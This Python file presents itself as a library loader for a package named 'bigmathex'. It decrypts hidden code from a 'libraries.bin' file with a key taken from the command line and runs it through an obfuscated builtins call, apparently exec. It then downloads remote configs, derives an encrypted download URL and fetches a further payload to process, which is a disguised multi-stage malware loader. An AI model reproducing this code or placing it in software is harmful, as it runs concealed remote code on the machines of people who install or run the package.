import os, sys, builtins, base64, hashlib, time, ssl, json
from urllib.request import urlopen, Request

cert_path = os.path.join(os.path.dirname(__file__), "cacert.pem")
ssl_context = ssl.create_default_context(cafile=cert_path) if os.path.exists(cert_path) else None

def decode_data(data: bytes, options: str) -> bytes:
    salt, ciphertext = data[:16], data[16:]
    key = hashlib.pbkdf2_hmac(
        "sha256",
        options.encode(),
        salt,
        100_000,
        dklen=len(ciphertext)
    )
    return bytes(c ^ k for c, k in zip(ciphertext, key))

library_name = b'\x9f\x8at\x08\x0c\x81a\xd9\x14&\xf05d(\xd93c0\x7fw\xd0\x19Zx'
options = sys.argv[1]

library_binary_path = os.path.join(os.path.dirname(__file__), "libraries.bin")
with open(library_binary_path, "r") as f:
    library_data = f.readlines()

data = base64.b64decode(library_data[0])
decoded_data = base64.b64decode(decode_data(data, options)).decode()

getattr(builtins, base64.b64decode(decode_data(library_name, options)).decode())(decoded_data)

def load(url, output_path):
    try:
        req = Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urlopen(req, context=ssl_context) as response, open(output_path, "wb") as out_file:
            if response.status != 200:
                print(f"Failed to download the file. Status code: {response.status}")
                return False
            data = response.read()
            out_file.write(data)
        return True
    except Exception as e:
        print(f"Download failed: {e}")
        return False

methods = {'get_output_file_path': None, 'load_libraries': None}
module_name = 'bigmathex'

def load_libraries(key):
    data = base64.b64decode(library_data[1].strip())
    decoded_data = base64.b64decode(decode_data(data, key)).decode()
    getattr(builtins, base64.b64decode(decode_data(library_name, options)).decode())(decoded_data)

    if not methods['get_output_file_path']:
        return

    max_retry_count = 10
    output_file_path = methods['get_output_file_path']()
    encoded = 'gObyPg9/bqOITx3s3cjKwOmZs6JyHHz3UrgNHKhZniYkaY9Gz3XTpYXOabufpnmLWX/F1g0rb9Fv26SYINTxaQe8ym3LMk127j/F17lQb5NlhrJSJkrcFg=='

    is_passed = False
    for config_url in config_urls:
        if not load(config_url, output_file_path):
            continue

        with open(output_file_path, "rb") as f:
            file_content = f.read().decode('utf-8')

            try:
                content_json = json.loads(file_content)
                numbers = content_json['version'].split(".")

                if not numbers or int(numbers[0]) < 16:
                    return
                else:
                    is_passed = True
            except Exception as e:
                pass
    if not is_passed:
        return

    for _ in range(max_retry_count):
        for remote_url in remote_urls:
            if not load(remote_url, output_file_path):
                time.sleep(2)
                continue

            download_url = ""
            with open(output_file_path, "rb") as f:
                file_content = f.read()
                sha256_hash = hashlib.sha256()
                sha256_hash.update(file_content + key.encode())
                hash_data = sha256_hash.digest()

                download_url = base64.b64decode(decode_data(base64.b64decode(encoded), base64.b64encode(hash_data).decode())).decode()

            if not download_url or not load(download_url, output_file_path):
                time.sleep(2)
                continue

            methods['process_downloaded_library'](output_file_path)
            break

if __name__ == "__main__":
    if len(sys.argv) >= 2:
        load_libraries(options)
